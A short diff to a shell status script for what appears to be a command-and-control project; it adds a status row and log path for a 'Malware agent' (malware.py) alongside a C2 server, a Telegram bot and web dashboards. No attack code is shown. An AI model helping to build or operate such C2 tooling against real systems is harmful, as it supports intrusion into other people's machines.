@@ -70,6 +70,9 @@ _last_log "/tmp/c2_server.log"
 _row "Telegram Bot     " "bot.py"            ""
 _last_log "/tmp/c2_bot.log"
 
+_row "Malware agent    " "malware.py"        ""
+_last_log "/tmp/c2_malware.log"
+
 _row "Flask Dashboard  " "dashboard/app.py"  "8080"
 _last_log "/tmp/dashboard.log"
 
@@ -94,5 +97,5 @@ echo -e "  ${CYAN}http://localhost:3000${NC}  ${DIM}← Next.js dashboard${NC}"
 echo -e "  ${CYAN}http://localhost:8080${NC}  ${DIM}← Flask API / legacy UI${NC}"
 echo -e "  ${CYAN}http://localhost:5000${NC}  ${DIM}← C2 server${NC}"
 echo -e ""
-echo -e "  ${DIM}Logs:  tail -f /tmp/c2_server.log /tmp/dashboard.log /tmp/frontend.log${NC}"
+echo -e "  ${DIM}Logs:  tail -f /tmp/c2_server.log /tmp/c2_bot.log /tmp/c2_malware.log /tmp/dashboard.log /tmp/frontend.log${NC}"
 echo -e "  ${DIM}Start: ./start_all.sh   Stop: ./stop_all.sh${NC}\n"
